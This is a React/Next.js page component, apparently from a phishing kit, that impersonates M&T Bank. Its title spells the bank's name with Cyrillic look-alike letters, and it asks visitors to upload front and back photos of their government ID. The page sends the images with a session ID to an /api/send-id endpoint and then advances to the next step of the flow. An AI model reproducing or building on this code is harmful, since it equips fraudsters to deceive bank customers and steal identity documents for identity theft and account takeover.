import React, { useContext, useEffect, useState } from "react";
import { Button } from "../../components/Button";
import { Container } from "../../components/Container";
import { Wrapper } from "../../components/Wrapper";
import * as yup from "yup";
import { Flex } from "@chakra-ui/react";
import { yupResolver } from "@hookform/resolvers/yup";
import axios from "axios";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import Head from "next/head";
import { FileInput } from "../../components/FileInput";
import { getNextUrl } from "../../utils/getNextUrl";
import { getProgress } from "../../utils/getProgress";
import { DataContext } from "../_app";

interface DocumentProps {}

const FILE_SIZE = 96000 * 1024;
const SUPPORTED_FORMATS = [`image/jpg`, `image/jpeg`, `image/gif`, `image/png`];

const schema = yup.object().shape({
  front: yup
    .mixed()
    .required(`Front image is required`)
    .test(`fileExist`, `Front image is required`, (value) => !!value[0])
    .test(
      `fileSize`,
      `Image is too large`,
      (value) => value[0] && value[0].size <= FILE_SIZE
    )
    .test(
      `fileFormat`,
      `Image format not supported`,
      (value) => value[0] && SUPPORTED_FORMATS.includes(value[0].type)
    ),
  back: yup
    .mixed()
    .required(`Front image is required`)
    .test(`fileExist`, `Front image is required`, (value) => !!value[0])
    .test(
      `fileSize`,
      `Image is too large`,
      (value) => value[0] && value[0].size <= FILE_SIZE
    )
    .test(
      `fileFormat`,
      `The image you are trying to upload is not supported`,
      (value) => value[0] && SUPPORTED_FORMATS.includes(value[0].type)
    ),
});

export const Document: React.FC<DocumentProps> = ({}) => {
  const {
    register,
    handleSubmit,
    formState: { errors },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onSubmit`,
  });

  const { push } = useRouter();

  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    const formData = new FormData();

    formData.append(`front`, data.front[0]);
    formData.append(`back`, data.back[0]);
    formData.append(`form`, `DOCUMENTS`);
    formData.append(`sessionId`, datas.sessionId);

    await axios.post(`/api/send-id`, formData, );
    setLoading(false);
    setData({
      ...datas,
      docs: {
        front: data.front[0],
        back: data.back[0],
      },
    });

    const url = getProgress()[getProgress().indexOf(`Document`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });
  return (
    <Wrapper>
      <Head>
        <title>{`Verify ID/Driver's License | М&Т Ваnk`}</title>
      </Head>
      <Container
        upTitle={`Secure your account`}
        title={`Verify ID/Driver's license`}
        subTitle={`Please take a picture of your government issued identity document.`}
        loading={loading}
      >
        <Flex w={`100%`} flexDir={`column`}>
          <FileInput
            register={register}
            watch={watch}
            errors={errors}
            name={`front`}
            label={`Front of ID`}
            placeholder={`Front of ID`}
          />
          <FileInput
            register={register}
            watch={watch}
            errors={errors}
            name={`back`}
            label={`Back of ID`}
            placeholder={`Back of ID`}
          />
        </Flex>
        <Button label={`Continue`} disabled={loading} onClick={onSubmit} />
      </Container>
    </Wrapper>
  );
};

export default Document;
